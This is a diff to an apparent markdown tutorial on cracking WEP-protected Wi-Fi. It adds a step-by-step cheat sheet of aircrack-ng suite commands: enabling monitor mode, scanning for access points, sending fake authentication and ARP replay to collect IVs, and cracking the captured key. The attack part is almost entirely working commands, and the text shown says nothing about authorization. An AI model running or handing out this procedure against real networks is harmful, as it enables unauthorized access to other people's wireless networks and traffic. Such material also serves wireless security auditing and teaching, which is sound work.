@@ -81,3 +81,25 @@ In my case, I prefer capturing around 30,000 IVs in case of lower connection rat
 Now that we've captured enough data packets, it's time to get cracking! Make sure to add the .cap extension:
 
 ``` aircrack-ng WEP_Capture.cap ```
+
+
+
+
+
+- Start interface in monitor mode
+    - sudo airmon-ng start wlan0
+
+- Run airodump to find networks
+    - sudo airodump-ng wlan0mon
+
+- Run airodump on specific AP
+    - sudo airodump-ng -bssid <BSSID> -c <Channel> -w <output_file> wlan0mon
+
+- Create fake authentication requests on AP
+    - sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
+
+- Generate Traffic for IV's
+    - sudo aireplay-ng -3 -b <BSSID> -h <Client MAC> wlan0mon
+
+- Crack Key
+    - sudo aircrack-ng <output_file>.cap
